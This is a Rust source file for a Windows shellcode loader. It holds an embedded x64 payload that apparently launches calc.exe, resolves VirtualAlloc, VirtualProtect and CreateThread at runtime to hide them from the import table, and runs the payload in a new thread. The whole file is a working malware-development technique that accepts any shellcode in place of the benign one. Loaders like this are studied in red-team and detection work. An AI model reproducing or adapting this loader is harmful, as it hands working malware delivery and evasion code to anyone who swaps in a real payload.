#[allow(deprecated)]
use std::{intrinsics::copy_nonoverlapping, ffi::CString};

use winapi::{ctypes::c_void, um::{
    errhandlingapi::GetLastError, minwinbase::{LPSECURITY_ATTRIBUTES, LPTHREAD_START_ROUTINE}, processthreadsapi::{GetCurrentProcessId}, winbase::INFINITE, winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE}
}};

const BUF: &[u8] = &[
    0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51,
    0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52,
    0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
    0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed,
    0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88,
    0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44,
    0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48,
    0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1,
    0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44,
    0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49,
    0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a,
    0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41,
    0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b,
    0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xe0, 0x1d, 0x2a, 0x0a, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
    0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47,
    0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e,
    0x65, 0x78, 0x65, 0x00,
];

#[allow(non_camel_case_types, non_snake_case)]
type fnVirtualAlloc = unsafe extern "system" fn(
    lpAddress: *mut c_void,
    dwSize: usize,
    flAllocationType: u32,
    flProtect: u32,
) -> *mut c_void;

#[allow(non_camel_case_types, non_snake_case)]
type fnVirtualProtect = unsafe extern "system" fn(
        lpAddress: *mut c_void,
        dwSize: usize,
        flNewProtect: u32,
        lpflOldProtect: *mut u32,
) -> u32;

#[allow(non_camel_case_types, non_snake_case)]
type fnCreateThread =extern "system" fn(
        lpThreadAttributes: LPSECURITY_ATTRIBUTES,
        dwStackSize: usize,
        lpStartAddress: LPTHREAD_START_ROUTINE,
        lpParameter: *mut c_void,
        dwCreationFlags: u32,
        lpThreadId: *mut u32,
) -> *mut c_void;

#[allow(non_camel_case_types, non_snake_case)]
type fnWaitForSingleObject = unsafe extern "system" fn(
        hHandle: *mut c_void,
        dwMilliseconds: u32,
) -> u32;

fn resolve_function_addr(module_name: &str, function_name: &str) -> Option<usize> {
    let c_module = CString::new(module_name).ok()?;
    let c_function = CString::new(function_name).ok()?;

    let module = unsafe { winapi::um::libloaderapi::GetModuleHandleA(c_module.as_ptr() as *const i8) };
    if module.is_null() {
        return None;
    }

    let function = unsafe { winapi::um::libloaderapi::GetProcAddress(module, c_function.as_ptr() as *const i8) };
    if function.is_null() {
        return None;
    }

    Some(function as usize)
}

fn pause() {
    println!("[#] Press <Enter> to run ...");
    let mut buffer = String::new();
    std::io::stdin().read_line(&mut buffer).unwrap();
}

fn main() {
    unsafe {
        println!("[+] Pid: {}", GetCurrentProcessId());

        // let shellcode_address = VirtualAlloc(
        //     std::ptr::null_mut(),
        //     BUF.len(),
        //     MEM_COMMIT | MEM_RESERVE,
        //     PAGE_READWRITE,
        // );

        let p_virtualalloc: fnVirtualAlloc = match resolve_function_addr("kernel32.dll", "VirtualAlloc") {
            Some(a) => std::mem::transmute(a),
            None => {
                println!("[!] Failed to resolve VirtualAlloc");
                return;
            }
        };

        let shellcode_address = p_virtualalloc(std::ptr::null_mut(), BUF.len(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);


        if shellcode_address.is_null() {
            println!("[!] VirtualAlloc Failed with error: {}", GetLastError());
            return;
        }

        copy_nonoverlapping(
            BUF.as_ptr(),
            shellcode_address as *mut u8,
            BUF.len(),
        );

        println!("[+] Shellcode Address: {:p}", shellcode_address);


        let p_virtualprotect: fnVirtualProtect = match resolve_function_addr("kernel32.dll", "VirtualProtect") {
            Some(a) => std::mem::transmute(a),
            None => {
                println!("[!] Failed to resolve VirtualProtect");
                return;
            }
        };

        let mut old_protect: u32 = 0;

        // let virtual_protect = VirtualProtect(
        //     shellcode_address,
        //     BUF.len(),
        //     PAGE_EXECUTE_READ,
        //     &mut old_protect,
        // );

        let virtual_protect = p_virtualprotect(shellcode_address, BUF.len(), PAGE_EXECUTE_READ, &mut old_protect);

        if virtual_protect == 0 {
            println!("[!] VirtualProtect Failed with error: {}", GetLastError());
            return;
        }

        // let thread_handle = CreateThread(
        //     std::ptr::null_mut(),
        //     0,
        //     Some(std::mem::transmute(shellcode_address)),
        //     std::ptr::null_mut(),
        //     0,
        //     std::ptr::null_mut(),
        // );

        let p_createthread: fnCreateThread = match resolve_function_addr("kernel32.dll", "CreateThread") {
            Some(a) => std::mem::transmute(a),
            None => {
                println!("[!] Failed to resolve CreateThread");
                return;
            }
        };

        let thread_handle = p_createthread(
            std::ptr::null_mut(),
            0,
            Some(std::mem::transmute(shellcode_address)),
            std::ptr::null_mut(),
            0,
            std::ptr::null_mut(),
        );

        if thread_handle.is_null() {
            println!("[!] CreateThread Failed with error: {}", GetLastError());
            return;
        }

        // WaitForSingleObject(thread_handle, INFINITE);

        let p_waitforsingleobject: fnWaitForSingleObject = match resolve_function_addr("kernel32.dll", "WaitForSingleObject") {
            Some(a) => std::mem::transmute(a),
            None => {
                println!("[!] Failed to resolve WaitForSingleObject");
                return;
            }
        };

        p_waitforsingleobject(thread_handle, INFINITE);


        pause();
    }
}
